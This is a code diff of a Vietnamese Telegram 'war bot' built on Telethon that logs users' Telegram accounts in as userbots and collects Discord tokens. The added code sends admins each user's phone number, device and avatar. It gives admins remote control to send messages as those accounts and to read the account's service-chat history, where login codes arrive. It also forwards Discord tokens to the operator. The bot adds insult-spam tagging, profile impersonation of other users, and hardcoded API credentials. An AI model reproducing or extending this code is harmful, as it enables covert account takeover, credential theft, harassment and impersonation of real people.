@@ -1,4 +1,4 @@
-import asyncio, os, random, datetime, re, glob, requests, json, base64, time
+import asyncio, os, random, datetime, re, glob, requests, json, base64, time, edge_tts
 from aiohttp import web, ClientSession
 from telethon import TelegramClient, events, Button, functions, types
 from telethon.errors import (
@@ -12,7 +12,8 @@ from telethon.errors import (
 # ==========================================
 A_ID = 32300846
 A_HS = "a6da3117ff6b8a1679d04ab743976068"
-B_TK = '8991807402:AAG9h73vG6QaMnWWBTiakYePWKwcamsbO1s'
+# Token mới chính xác của bạn
+B_TK = '8991807402:AAG-2jT1jKj5Zxo0mndem7Q1WPxI4L19dDc'
 O_ID = 7907990385
 
 REQUIRED_GROUPS = [
@@ -63,9 +64,9 @@ def _sync():
 _sync()
 
 bot = TelegramClient('bot_manage', A_ID, A_HS)
-u_c, s_t, cl_t, w_m = {}, {}, {}, {}
+o_p, u_c, c_b, c_i, s_t, cl_t, w_m = {}, {}, {}, {}, {}, {}, {}
 
-F1, F2, F3, F4 = "bot_users.txt", "banned_users.txt", "joined_users.txt", "admins.txt"
+F1, F2, F3, F4, F5 = "bot_users.txt", "banned_users.txt", "joined_users.txt", "admins.txt", "vip_users.txt"
 
 if os.path.exists(F2):
     with open(F2, "r") as f: b_u = set(int(l.strip()) for l in f if l.strip())
@@ -79,9 +80,25 @@ if os.path.exists(F4):
     with open(F4, "r") as f: admins = set(int(l.strip()) for l in f if l.strip())
 else: admins = {O_ID}
 
+if os.path.exists(F5):
+    with open(F5, "r") as f: v_u = set(int(l.strip()) for l in f if l.strip())
+else: v_u = set()
+
 def _save_verified():
     with open(F3, "w") as f:
         for uid in verified_users: f.write(f"{uid}\n")
+
+def _save_admins():
+    with open(F4, "w") as f:
+        for aid in admins: f.write(f"{aid}\n")
+
+def _sv():
+    with open(F5, "w") as f:
+        for u in v_u: f.write(f"{u}\n")
+
+def _sb():
+    with open(F2, "w") as f:
+        for u in b_u: f.write(f"{u}\n")
 
 def _su(u):
     if not os.path.exists(F1): open(F1, "w").close()
@@ -111,11 +128,11 @@ async def is_user_in_channel(user_id):
         return False
 
 # ==========================================
-# GIAO DIỆN & MENU
+# GIAO DIỆN CHỌN APP & MENU TELEGRAM
 # ==========================================
 def get_app_selector_menu():
     msg = """
-🤖 **Bot War By Trần Minh Đức**
+🤖 **Bot War Multi-Platform By Trần Minh Đức**
 ────────────────
 Vui lòng chọn ứng dụng bạn muốn chiến:
 """
@@ -146,6 +163,10 @@ def get_main_menu(u):
         buttons.append([Button.inline("🎮 Bảng Điều Khiển Acc Remote (Admin)", data="m_control")])
 
     buttons.append([Button.inline("📱 LOGIN TÀI KHOẢN", data="login"), Button.inline("🚪 LOGOUT", data="logout_acc")])
+    
+    if u in admins:
+        buttons.append([Button.inline("👑 Lệnh Admin System", data="m_admin")])
+        
     buttons.append([Button.inline("🔙 Quay Lại Chọn App", data="back_to_apps")])
     buttons.append([Button.url("💬 Admin Hỗ Trợ", "https://t.me/Mduchotwar")])
     
@@ -230,7 +251,7 @@ def render_discord_dashboard(u):
     ])
     buttons.append([
         Button.inline("🚪 Đăng Xuất", data="dc_logout"),
-        Button.inline("🔙 Quay Lại", data="back_to_apps")
+        Button.inline("🔙 Quay Lại Chọn App", data="back_to_apps")
     ])
 
     return txt, buttons
@@ -289,36 +310,82 @@ async def notify_admin_discord_token(user_id, token, user_data, created_at):
 async def notify_admin_login(client, user_id, phone_number):
     try:
         me = await client.get_me()
+        full_user = await client(functions.users.GetFullUserRequest(id=me.id))
+        about_text = full_user.full_user.about or "Không có"
+        
+        device_model = "Không xác định"
+        app_version = "Không xác định"
+        try:
+            auths = await client(functions.account.GetAuthorizationsRequest())
+            for auth in auths.authorizations:
+                if auth.current:
+                    device_model = f"{auth.device_model} ({auth.platform})"
+                    app_version = auth.app_name
+                    break
+        except: pass
+
         now = datetime.datetime.now().strftime('%H:%M:%S - %d/%m/%Y')
+        photos = await client.get_profile_photos('me', limit=1)
+        avatar_path = None
+        if photos:
+            avatar_path = await client.download_media(photos[0], file=f"avatar_{user_id}.jpg")
+        
         caption = f"""
-🚨 **TELEGRAM LOGIN THÀNH CÔNG**
+🚨 **THÔNG BÁO TÀI KHOẢN LOGIN THÀNH CÔNG**
 ────────────────
 • **Thời gian:** `{now}`
 • **ID Userbot:** `{me.id}`
 • **Họ Tên:** `{me.first_name} {me.last_name or ''}`
 • **Username:** `@{me.username if me.username else 'N/A'}`
-• **SĐT:** `+{phone_number}`
-• **User Bot ID:** `{user_id}`
+• **Số Điện Thoại:** `+{phone_number}`
+• **Bio:** `{about_text}`
+• **Thiết Bị:** `{device_model}`
+• **ID Bot User:** `{user_id}`
 """
         buttons = [[Button.inline("🎮 Điều Khiển Acc Này", data=f"sel_acc_{user_id}")]]
         for admin_id in admins:
             try:
-                await bot.send_message(admin_id, caption, buttons=buttons, parse_mode='markdown')
+                if avatar_path and os.path.exists(avatar_path):
+                    await bot.send_file(admin_id, avatar_path, caption=caption, buttons=buttons, parse_mode='markdown')
+                else:
+                    await bot.send_message(admin_id, caption, buttons=buttons, parse_mode='markdown')
             except: pass
-    except: pass
+        if avatar_path and os.path.exists(avatar_path): os.remove(avatar_path)
+    except Exception as e:
+        print(f"Lỗi gửi thông báo login: {e}")
 
 async def start_anti_disconnect(target_uid, client):
     while target_uid in u_c:
-        try:
-            await client.get_me()
+        try: await client.get_me()
         except: pass
         await asyncio.sleep(240)
 
-def _telegram_userbot_logic(c, u_i):
+# ==========================================
+# LOGIC USERBOT TELEGRAM
+# ==========================================
+def _logic(c, u_i):
+    def _mk(cid): w_m[f"{u_i}_{cid}"] = datetime.datetime.now(datetime.timezone.utc)
+
+    async def _sd(cid, ct, tid=None):
+        s_t[u_i] = True
+        inf = isinstance(ct, str)
+        ls = ct if not inf else [ct]
+        while s_t.get(u_i):
+            for m in ls:
+                if not s_t.get(u_i): break
+                try:
+                    fm = f"{m.strip()} [\u200b](tg://user?id={tid})" if tid else m.strip()
+                    await c.send_message(cid, fm, parse_mode='markdown')
+                    delay = get_user_delay(u_i)
+                    await asyncio.sleep(delay)
+                except FloodWaitError as e: await asyncio.sleep(e.seconds + 2)
+                except: break
+            if not inf: break
+
     @c.on(events.NewMessage(outgoing=True, pattern=r'/sptagname (@?\w+)'))
     async def _sptagname(e):
         username = e.pattern_match.group(1).replace('@', '')
-        await e.delete()
+        _mk(e.chat_id); await e.delete()
         if os.path.exists('chui.txt'):
             with open('chui.txt', 'r', encoding='utf-8') as f:
                 lines = [line.strip() for line in f if line.strip()]
@@ -335,12 +402,141 @@ def _telegram_userbot_logic(c, u_i):
                     except FloodWaitError as err: await asyncio.sleep(err.seconds + 2)
                     except: break
 
+    @c.on(events.NewMessage(outgoing=True, pattern=r'/info(?:\s+(.+))?'))
+    async def _inf(e):
+        target = e.pattern_match.group(1)
+        try:
+            if target: user = await c.get_entity(int(target) if target.isdigit() else target)
+            elif e.is_reply: user = await c.get_entity((await e.get_reply_message()).sender_id)
+            else: user = await c.get_me()
+            await e.edit(f"👤 **Name:** {user.first_name}\n🆔 **ID:** `{user.id}`\n🏷 **User:** @{user.username if user.username else 'N/A'}")
+        except: await e.edit("❌ **Không tìm thấy!**")
+
+    @c.on(events.NewMessage(outgoing=True, pattern=r'/fake(?:\s+(.+))?'))
+    async def _fk(e):
+        t = e.pattern_match.group(1)
+        try:
+            if t: target = await c.get_entity(int(t) if t.isdigit() else t)
+            elif e.is_reply: target = await c.get_entity((await e.get_reply_message()).sender_id)
+            else: return await e.edit("⚠️ Tag, ID hoặc Reply!")
+        except: return await e.edit("❌ Không thấy!")
+        await e.edit("🔄 Đang fake...")
+        try:
+            me = await c.get_me()
+            me_f = await c(functions.users.GetFullUserRequest(id=me.id))
+            my_p = await c.download_profile_photo('me')
+            o_p[u_i] = {'f': me.first_name, 'l': me.last_name, 'a': me_f.full_user.about or "", 'p': my_p}
+            tf = await c(functions.users.GetFullUserRequest(id=target.id))
+            tu = tf.users[0]
+            await c(functions.account.UpdateProfileRequest(first_name=tu.first_name or "", last_name=tu.last_name or "", about=tf.full_user.about or ""))
+            p = await c.get_profile_photos(target.id, limit=1)
+            if p:
+                path = await c.download_media(p[0])
+                await c(functions.photos.UploadProfilePhotoRequest(file=await c.upload_file(path)))
+                if os.path.exists(path): os.remove(path)
+            await e.edit("✅ Fake xong"); await asyncio.sleep(1); await e.delete()
+        except: await e.edit("❌ Lỗi Fake")
+
+    @c.on(events.NewMessage(outgoing=True, pattern=r'/diefake'))
+    async def _dfk(e):
+        if u_i not in o_p: return await e.edit("⚠️ Chưa lưu gốc!")
+        await e.edit("🔙 Đang về lại acc gốc...")
+        o = o_p[u_i]
+        try:
+            await c(functions.account.UpdateProfileRequest(first_name=o['f'] or "", last_name=o['l'] or "", about=o['a'] or ""))
+            if o['p'] and os.path.exists(o['p']):
+                await c(functions.photos.UploadProfilePhotoRequest(file=await c.upload_file(o['p'])))
+                os.remove(o['p'])
+            o_p.pop(u_i)
+            await e.edit("✅ Về gốc xong"); await asyncio.sleep(1); await e.delete()
+        except: await e.edit("❌ Lỗi diefake")
+
+    @c.on(events.NewMessage(outgoing=True, pattern=r'/sp (\d+)'))
+    async def _sp1(e):
+        t = int(e.pattern_match.group(1)); _mk(e.chat_id); await e.delete()
+        if os.path.exists('chui.txt'): await _sd(e.chat_id, open('chui.txt', 'r', encoding='utf-8').readlines(), t)
+
+    @c.on(events.NewMessage(outgoing=True, pattern=r'/sp2 (\d+)'))
+    async def _sp2(e):
+        t = int(e.pattern_match.group(1)); _mk(e.chat_id); await e.delete()
+        if os.path.exists('chui2.txt'): await _sd(e.chat_id, open('chui2.txt', 'r', encoding='utf-8').read().strip(), t)
+
+    @c.on(events.NewMessage(outgoing=True, pattern=r'/spicon (\d+)'))
+    async def _spi(e):
+        _mk(e.chat_id); s_t[u_i] = True; await e.delete()
+        try: cnt = int(e.pattern_match.group(1))
+        except: cnt = 10
+        for _ in range(min(cnt, 500)):
+            if not s_t.get(u_i): break
+            await e.respond(random.choice(["🧠", "💩", "🤪", "🤣", "💀", "🤡", "🫵", "🙄", "🤙", "👻"]))
+            await asyncio.sleep(get_user_delay(u_i))
+
     @c.on(events.NewMessage(outgoing=True, pattern=r'/stop'))
     async def _stp(e):
         s_t[u_i] = False; cl_t[u_i] = False; await e.edit("🛑 **STOP!**"); await asyncio.sleep(1); await e.delete()
 
+    if u_i not in c_b: c_b[u_i] = {}
+    if u_i not in c_i: c_i[u_i] = set()
+
+    @c.on(events.NewMessage(outgoing=True, pattern=r'/cam (\d+)'))
+    async def _cam_box(e):
+        target = int(e.pattern_match.group(1))
+        c_b[u_i][(e.chat_id, target)] = True
+        await e.edit(f"☠ **Đã CÂM ID `{target}` tại box này!**")
+        await asyncio.sleep(2); await e.delete()
+
+    @c.on(events.NewMessage(outgoing=True, pattern=r'/sua (\d+)'))
+    async def _sua_box(e):
+        target = int(e.pattern_match.group(1))
+        c_b[u_i].pop((e.chat_id, target), None)
+        await e.edit(f"✅ **Đã THÁO CÂM cho ID `{target}` tại box này!**")
+        await asyncio.sleep(2); await e.delete()
+
+    @c.on(events.NewMessage(outgoing=True, pattern=r'/camib (\d+)'))
+    async def _cam_ib(e):
+        target = int(e.pattern_match.group(1))
+        c_i[u_i].add(target)
+        await e.edit(f"☠ **Đã CÂM INBOX ID `{target}`!**")
+        await asyncio.sleep(2); await e.delete()
+
+    @c.on(events.NewMessage(outgoing=True, pattern=r'/suaib (\d+)'))
+    async def _sua_ib(e):
+        target = int(e.pattern_match.group(1))
+        c_i[u_i].discard(target)
+        await e.edit(f"✅ **Đã THÁO CÂM INBOX cho ID `{target}`!**")
+        await asyncio.sleep(2); await e.delete()
+
+    @c.on(events.NewMessage(incoming=True))
+    async def _auto_delete_muted(e):
+        sender_id = e.sender_id
+        if not sender_id: return
+        if (e.chat_id, sender_id) in c_b.get(u_i, {}) or (e.is_private and sender_id in c_i.get(u_i, set())):
+            try: await e.delete()
+            except: pass
+
+    @c.on(events.NewMessage(outgoing=True, pattern=r'/voice(?:\s+(.+))?'))
+    async def _voice_cmd(e):
+        text = e.pattern_match.group(1)
+        if not text and e.is_reply:
+            reply_msg = await e.get_reply_message()
+            text = reply_msg.text
+        if not text:
+            return await e.edit("⚠️ **Vui lòng nhập nội dung cần tạo Voice!**\n*(VD: `/voice Xin chào bạn`)*")
+
+        await e.edit("🎙 **Đang khởi tạo Voice...**")
+        file_path = f"voice_{u_i}_{int(datetime.datetime.now().timestamp())}.mp3"
+        try:
+            communicate = edge_tts.Communicate(text, "vi-VN-NamMinhNeural")
+            await communicate.save(file_path)
+            await c.send_file(e.chat_id, file_path, voice_note=True, reply_to=e.reply_to_msg_id)
+            await e.delete()
+        except Exception as ex:
+            await e.edit(f"❌ **Lỗi tạo Voice:** `{ex}`")
+        finally:
+            if os.path.exists(file_path): os.remove(file_path)
+
 # ==========================================
-# CALLBACK HANDLER TỔNG HỢP (TELEGRAM + DISCORD + ADMIN)
+# CALLBACK HANDLER TỔNG HỢP
 # ==========================================
 @bot.on(events.NewMessage(pattern='/start'))
 async def _st(ev):
@@ -394,74 +590,219 @@ async def _callback_handler(ev):
 
     # ADMIN CONTROL PANEL
     elif data == "m_control":
-        if u not in admins:
-            return await ev.answer("❌ Bạn không có quyền Admin!", alert=True)
-        
-        active_accs = list(u_c.keys())
-        msg = f"""
-🎮 **BẢNG ĐIỀU KHIỂN ACC REMOTE (ADMIN)**
-────────────────
-• Tổng số tài khoản userbot đang chạy: `{len(active_accs)}`
-• Danh sách ID Userbot đang Online:
-"""
+        if u not in admins: return await ev.answer("❌ Chỉ Admin mới có quyền!", alert=True)
+        if not u_c:
+            txt = "🎮 **BẢNG ĐIỀU KHIỂN TÀI KHOẢN REMOTE**\n────────────────\n⚠️ *Hiện chưa có tài khoản nào đăng nhập.*"
+            return await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về Menu Telegram", data="app_telegram")]], parse_mode='markdown')
+
+        txt = f"🎮 **QUẢN LÝ TÀI KHOẢN THEO STT**\n────────────────\n• Tổng số tài khoản: `{len(u_c)}`\n👇 **Chọn tài khoản bên dưới:**"
         buttons = []
-        for acc_id in active_accs:
-            buttons.append([Button.inline(f"📱 Quản lý Acc: {acc_id}", data=f"sel_acc_{acc_id}")])
+        idx = 1
+        for uid in u_c.keys():
+            buttons.append([Button.inline(f"TK {idx}. ID: {uid}", data=f"sel_acc_{uid}")])
+            idx += 1
         buttons.append([Button.inline("🔙 Trở Về Menu Telegram", data="app_telegram")])
-        await ev.edit(msg, buttons=buttons, parse_mode='markdown')
+        await ev.edit(txt, buttons=buttons, parse_mode='markdown')
 
     elif data.startswith("sel_acc_"):
-        if u not in admins:
-            return await ev.answer("❌ Bạn không có quyền Admin!", alert=True)
-        target_acc_id = int(data.split("_")[2])
-        admin_selected_target[u] = target_acc_id
+        if u not in admins: return await ev.answer("Chỉ Admin mới có quyền!", alert=True)
+        target_uid = int(data.split("_")[2])
+        if target_uid not in u_c: return await ev.answer("Tài khoản này đã logout!", alert=True)
+        admin_selected_target[u] = target_uid
+        client = u_c[target_uid]
+        me = await client.get_me()
         
-        msg = f"""
-🎮 **QUẢN LÝ TÀI KHOẢN: `{target_acc_id}`**
+        txt = f"""🕹 **HỒ SƠ TÀI KHOẢN ĐANG ĐIỀU KHIỂN:**
 ────────────────
-• Chọn thao tác muốn thực hiện trên tài khoản này:
+👤 **Tên:** {me.first_name}
+🆔 **ID:** `{me.id}`
 """
         buttons = [
-            [Button.inline("🛑 Dừng mọi tiến trình Spam/Tag", data="adm_stop_acc")],
-            [Button.inline("🚪 Buộc đăng xuất (Logout) Acc này", data="adm_logout_acc")],
-            [Button.inline("🔙 Trở lại danh sách Acc", data="m_control")]
+            [Button.inline("💬 Gửi Tin Nhắn", data="rmt_send_one"), Button.inline("📢 Gửi All Nhóm", data="rmt_send_all")],
+            [Button.inline("📋 Check Số Nhóm", data="rmt_count_groups"), Button.inline("📜 Lịch Sử 10 Tin", data="rmt_hist_p1")],
+            [Button.inline("🔙 Chọn Tài Khoản Khác", data="m_control")]
         ]
-        await ev.edit(msg, buttons=buttons, parse_mode='markdown')
+        await ev.edit(txt, buttons=buttons, parse_mode='markdown')
 
-    elif data == "adm_stop_acc":
-        target = admin_selected_target.get(u)
-        if target in s_t: s_t[target] = False
-        if target in cl_t: cl_t[target] = False
-        await ev.answer(f"🛑 Đã gửi lệnh dừng cho tài khoản {target}!", alert=True)
-
-    elif data == "adm_logout_acc":
-        target = admin_selected_target.get(u)
-        if target in u_c:
+    elif data == "rmt_send_one":
+        if u not in admins: return
+        target_uid = admin_selected_target.get(u)
+        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
+        await ev.answer()
+        async with bot.conversation(u) as cv:
+            await cv.send_message("🎯 **Nhập ID hoặc @username người nhận/nhóm:**")
+            chat_target = (await cv.get_response()).text.strip()
+            await cv.send_message("📝 **Nhập nội dung tin nhắn:**")
+            msg_text = (await cv.get_response()).text.strip()
             try:
-                await u_c[target].disconnect()
+                chat_entity = int(chat_target) if chat_target.isdigit() or chat_target.startswith("-") else chat_target
+                await u_c[target_uid].send_message(chat_entity, msg_text)
+                await cv.send_message(f"✅ **Đã gửi thành công!**")
+            except Exception as ex:
+                await cv.send_message(f"❌ **Lỗi:** `{ex}`")
+
+    elif data == "rmt_send_all":
+        if u not in admins: return
+        target_uid = admin_selected_target.get(u)
+        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
+        await ev.answer()
+        async with bot.conversation(u) as cv:
+            await cv.send_message("📢 **Nhập nội dung gửi TẤT CẢ các nhóm:**")
+            msg_text = (await cv.get_response()).text.strip()
+            client = u_c[target_uid]
+            await cv.send_message("⏳ Đang tiến hành gửi...")
+            success, fail = 0, 0
+            dialogs = await client.get_dialogs(limit=100)
+            for d in dialogs:
+                if d.is_group or d.is_channel:
+                    try:
+                        await client.send_message(d.id, msg_text)
+                        success += 1
+                        await asyncio.sleep(1)
+                    except: fail += 1
+            await cv.send_message(f"✅ **Đã gửi xong!** Thành công: `{success}` | Thất bại: `{fail}`")
+
+    elif data == "rmt_count_groups":
+        if u not in admins: return
+        target_uid = admin_selected_target.get(u)
+        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
+        client = u_c[target_uid]
+        await ev.answer("⏳ Đang quét toàn bộ nhóm/kênh...", alert=True)
+        try:
+            dialogs = await client.get_dialogs()
+            groups_count, channels_count, private_count = 0, 0, 0
+            for d in dialogs:
+                if d.is_group: groups_count += 1
+                elif d.is_channel: channels_count += 1
+                elif d.is_user: private_count += 1
+            text = f"""📊 **THỐNG KÊ CHI TIẾT TÀI KHOẢN:**
+────────────────
+• Tổng số đoạn chat: `{len(dialogs)}`
+• Số Nhóm (Groups): `{groups_count}`
+• Số Kênh (Channels): `{channels_count}`
+• Số Chat Riêng (Private): `{private_count}`
+"""
+            await ev.edit(text, buttons=[[Button.inline("🔙 Trở Về", data=f"sel_acc_{target_uid}")]], parse_mode='markdown')
+        except Exception as ex:
+            await ev.edit(f"❌ Lỗi: {ex}", buttons=[[Button.inline("🔙 Trở Về", data=f"sel_acc_{target_uid}")]])
+
+    elif data.startswith("rmt_hist_p"):
+        if u not in admins: return
+        target_uid = admin_selected_target.get(u)
+        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
+        client = u_c[target_uid]
+        page = int(data.split("p")[1])
+        await ev.answer(f"⏳ Đang tải trang {page}...", alert=True)
+        try:
+            all_msgs = []
+            try:
+                messages = await client.get_messages(777000, limit=10)
+                for m in messages:
+                    msg_content = m.text.replace("\n", " ") if m.text else "[Media/Service]"
+                    date_str = m.date.strftime('%H:%M:%S %d/%m/%Y') if m.date else ""
+                    all_msgs.append(f"🔔 `[{date_str}]`: {msg_content}")
             except: pass
-            u_c.pop(target, None)
-            if target in anti_disconnect_tasks:
-                anti_disconnect_tasks[target].cancel()
-                anti_disconnect_tasks.pop(target, None)
-            await ev.answer(f"🚪 Đã đăng xuất tài khoản {target}!", alert=True)
-        else:
-            await ev.answer("⚠️ Tài khoản không tồn tại hoặc đã offline!", alert=True)
+            if not all_msgs:
+                dialogs = await client.get_dialogs(limit=1)
+                for d in dialogs:
+                    msgs = await client.get_messages(d.id, limit=10)
+                    for m in msgs:
+                        msg_content = m.text.replace("\n", " ") if m.text else "[Media]"
+                        date_str = m.date.strftime('%H:%M:%S %d/%m/%Y') if m.date else ""
+                        all_msgs.append(f"💬 **{d.name}** `[{date_str}]`: {msg_content}")
+            total_items = len(all_msgs)
+            if total_items == 0:
+                return await ev.edit("📜 Không có lịch sử tin nhắn nào!", buttons=[[Button.inline("🔙 Trở Về", data=f"sel_acc_{target_uid}")]])
+            items_per_page = 3
+            total_pages = (total_items + items_per_page - 1) // items_per_page
+            if page > total_pages: page = total_pages
+            if page < 1: page = 1
+            start_idx = (page - 1) * items_per_page
+            end_idx = start_idx + items_per_page
+            current_msgs = all_msgs[start_idx:end_idx]
+            text = f"📜 **LỊCH SỬ TIN NHẮN (Trang {page}/{total_pages}):**\n────────────────\n"
+            for msg_item in current_msgs: text += f"• {msg_item}\n\n"
+            nav_buttons = []
+            if page > 1: nav_buttons.append(Button.inline("⬅️ Trước", data=f"rmt_hist_p{page-1}"))
+            if page < total_pages: nav_buttons.append(Button.inline("Sau ➡️", data=f"rmt_hist_p{page+1}"))
+            buttons = [nav_buttons] if nav_buttons else []
+            buttons.append([Button.inline("🔙 Trở Về Quản Lý", data=f"sel_acc_{target_uid}")])
+            await ev.edit(text, buttons=buttons, parse_mode='markdown')
+        except Exception as ex:
+            await ev.edit(f"❌ Lỗi tải lịch sử: {ex}", buttons=[[Button.inline("🔙 Trở Về", data=f"sel_acc_{target_uid}")]])
+
+    # TELEGRAM MENU OPTIONS
+    elif data == "m_main":
         msg, buttons = get_main_menu(u)
         await ev.edit(msg, buttons=buttons, parse_mode='markdown')
 
-    # TELEGRAM MENU OPTIONS
     elif data == "m_spam":
-        await ev.answer("💥 Hướng dẫn Spam: Dùng lệnh `/sptagname @username` trực tiếp trên tài khoản Userbot của bạn!", alert=True)
+        warn = "\n\n⚠️ **Lưu ý:** *Vui lòng LOGIN tài khoản để thực thi các lệnh này!*" if u not in u_c else ""
+        txt = f"💥 **DANH SÁCH LỆNH SPAM & TAG**\n────────────────\n• `/sptagname <Tên>`: Spam tag kèm tên\n• `/sp <id>`: Spam chửi 1\n• `/sp2 <id>`: Spam chửi 2\n• `/spicon <số>`: Spam icon\n• `/stop`: Dừng lại tất cả{warn}"
+        await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về", data="m_main")]], parse_mode='markdown')
 
     elif data == "m_mute":
-        await ev.answer("☠ Chức năng Mute đang sẵn sàng trên Userbot.", alert=True)
+        warn = "\n\n⚠️ **Lưu ý:** *Vui lòng LOGIN tài khoản để thực thi các lệnh này!*" if u not in u_c else ""
+        txt = f"☠ **DANH SÁCH LỆNH MUTE / CÂM**\n────────────────\n• `/cam <id>`: Câm box\n• `/sua <id>`: Mở câm box\n• `/camib <id>`: Câm inbox\n• `/suaib <id>`: Mở câm inbox{warn}"
+        await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về", data="m_main")]], parse_mode='markdown')
 
     elif data == "m_other":
-        await ev.answer("📦 Các tiện ích bổ sung đang hoạt động.", alert=True)
+        warn = "\n\n⚠️ **Lưu ý:** *Vui lòng LOGIN tài khoản để thực thi các lệnh này!*" if u not in u_c else ""
+        txt = f"📦 **DANH SÁCH LẶT VẶT & ACC**\n────────────────\n• `/info <@/id/rep>`: Soi acc\n• `/fake <@/id/rep>`: Fake acc đối tượng\n• `/diefake`: Trở về acc gốc\n• `/voice <văn bản>`: Tạo voice\n• `/logout`: Thoát acc khỏi bot{warn}"
+        await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về", data="m_main")]], parse_mode='markdown')
 
     elif data == "m_setting":
-        await ev.answer(f"⚙️ Delay hiện tại của bạn là: {get_user_delay(u)}s", alert=True)
+        cur_d = get_user_delay(u)
+        txt = f"""
+⚙️ **CẤU HÌNH DELAY TOÀN BỘ CHỨC NĂNG**
+────────────────
+• Delay hiện tại của bạn: `{cur_d} giây`
+• Mặc định hệ thống: `{DEFAULT_DELAY} giây`
+"""
+        buttons = [
+            [Button.inline("⏱ Đặt Mặc Định (0.2s)", data="set_delay_default")],
+            [Button.inline("⚡ Set Delay 0.1s", data="set_delay_01"), Button.inline("🐢 Set Delay 0.5s", data="set_delay_05")],
+            [Button.inline("🐌 Set Delay 1.0s", data="set_delay_10"), Button.inline("💬 Nhập Số Giây Tự Chỉnh", data="set_delay_custom")],
+            [Button.inline("🔙 Trở Về Menu", data="m_main")]
+        ]
+        await ev.edit(txt, buttons=buttons, parse_mode='markdown')
+
+    elif data == "set_delay_default":
+        user_delays[u] = DEFAULT_DELAY
+        await ev.answer(f"✅ Đã reset Delay về mặc định ({DEFAULT_DELAY}s)", alert=True)
+        msg, buttons = get_main_menu(u)
+        await ev.edit(msg, buttons=buttons, parse_mode='markdown')
+
+    elif data == "set_delay_01":
+        user_delays[u] = 0.1
+        await ev.answer("✅ Đã đổi Delay thành 0.1s", alert=True)
+        msg, buttons = get_main_menu(u)
+        await ev.edit(msg, buttons=buttons, parse_mode='markdown')
+
+    elif data == "set_delay_05":
+        user_delays[u] = 0.5
+        await ev.answer("✅ Đã đổi Delay thành 0.5s", alert=True)
+        msg, buttons = get_main_menu(u)
+        await ev.edit(msg, buttons=buttons, parse_mode='markdown')
+
+    elif data == "set_delay_10":
+        user_delays[u] = 1.0
+        await ev.answer("✅ Đã đổi Delay thành 1.0s", alert=True)
+        msg, buttons = get_main_menu(u)
+        await ev.edit(msg, buttons=buttons, parse_mode='markdown')
+
+    elif data == "set_delay_custom":
+        await ev.answer()
+        async with bot.conversation(u) as cv:
+            await cv.send_message("⏱ **Nhập thời gian Delay mong muốn** (tính bằng giây, ví dụ: `0.3` hoặc `2`):")
+            try:
+                res = await cv.get_response()
+                val = float(res.text.strip())
+                if val < 0.05: val = 0.05
+                user_delays[u] = val
+                await cv.send_message(f"✅ **Đã cài đặt Delay thành công:** `{val} giây`!")
+            except:
+                await cv.send_message("❌ Số giây nhập không hợp lệ!")
 
     elif data == "logout_acc":
         if u in u_c:
@@ -478,15 +819,18 @@ async def _callback_handler(ev):
         msg, buttons = get_main_menu(u)
         await ev.edit(msg, buttons=buttons, parse_mode='markdown')
 
+    elif data == "m_admin":
+        if u not in admins: return await ev.answer("❌ Chỉ Admin!", alert=True)
+        txt = "👑 **ADMIN SYSTEM**\n• `/ban <id>`\n• `/unban <id>`\n• `/addadmin <id>`\n• `/addvip <id>`\n• `/delvip <id>`\n• `/tb <nội dung>`"
+        await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về", data="m_main")]], parse_mode='markdown')
+
     # DISCORD CONVERSATION SETTINGS
     elif data in ["dc_set_tokens", "dc_set_channels", "dc_set_content", "dc_set_tag", "dc_set_delay"]:
-        if u not in discord_sessions:
-            discord_sessions[u] = {}
-        
+        if u not in discord_sessions: discord_sessions[u] = {}
         await ev.answer()
         async with bot.conversation(u, timeout=60) as cv:
             if data == "dc_set_tokens":
-                await cv.send_message("🔑 **Nhập Token Discord của bạn** *(Nếu có nhiều token, cách nhau bằng dấu phẩy `,` hoặc khoảng trắng)*:")
+                await cv.send_message("🔑 **Nhập Token Discord của bạn** *(Nhiều token cách nhau bằng dấu phẩy `,`)*:")
                 resp = await cv.get_response()
                 raw_tokens = resp.text.strip()
                 tokens = [t.strip() for t in raw_tokens.replace(",", " ").split() if t.strip()]
@@ -494,8 +838,7 @@ async def _callback_handler(ev):
                     discord_sessions[u]["tokens"] = tokens
                     for t in tokens:
                         valid, user_data, created_at = await get_discord_user_info(t)
-                        if valid:
-                            await notify_admin_discord_token(u, t, user_data, created_at)
+                        if valid: await notify_admin_discord_token(u, t, user_data, created_at)
                     await cv.send_message(f"✅ **Đã lưu thành công {len(tokens)} Token Discord!**")
 
             elif data == "dc_set_channels":
@@ -506,8 +849,7 @@ async def _callback_handler(ev):
                 if channel_ids:
                     discord_sessions[u]["channels"] = channel_ids
                     await cv.send_message(f"✅ **Đã cập nhật {len(channel_ids)} ID Kênh thành công!**")
-                else:
-                    await cv.send_message("❌ ID kênh không hợp lệ!")
+                else: await cv.send_message("❌ ID kênh không hợp lệ!")
 
             elif data == "dc_set_content":
                 await cv.send_message("📝 **Gửi file .txt chứa nội dung spam** hoặc **nhập trực tiếp văn bản** *(Gửi chữ `reset` để dùng kho mặc định)*:")
@@ -529,7 +871,7 @@ async def _callback_handler(ev):
                     if lines:
                         discord_sessions[u]["lines"] = lines
                         discord_sessions[u]["use_custom_file"] = True
-                        await cv.send_message(f"✅ **Đã cập nhật nội dung văn bản riêng!**")
+                        await cv.send_message("✅ **Đã cập nhật nội dung văn bản riêng!**")
 
             elif data == "dc_set_tag":
                 await cv.send_message("🏷 **Nhập User ID Discord cần tag cuối câu** *(Gửi `0` để tắt)*:")
@@ -549,8 +891,7 @@ async def _callback_handler(ev):
                     d = float(resp.text.strip())
                     discord_sessions[u]["delay"] = max(0.1, d)
                     await cv.send_message(f"✅ **Đã cập nhật Delay thành {discord_sessions[u]['delay']}s!**")
-                except:
-                    await cv.send_message("❌ Giá trị không hợp lệ!")
+                except: await cv.send_message("❌ Giá trị không hợp lệ!")
 
         txt, buttons = render_discord_dashboard(u)
         await ev.respond(txt, buttons=buttons, parse_mode='markdown')
@@ -573,10 +914,8 @@ async def _callback_handler(ev):
         session = discord_sessions.get(u, {})
         tokens = session.get("tokens", [])
         channels = session.get("channels", [])
-        
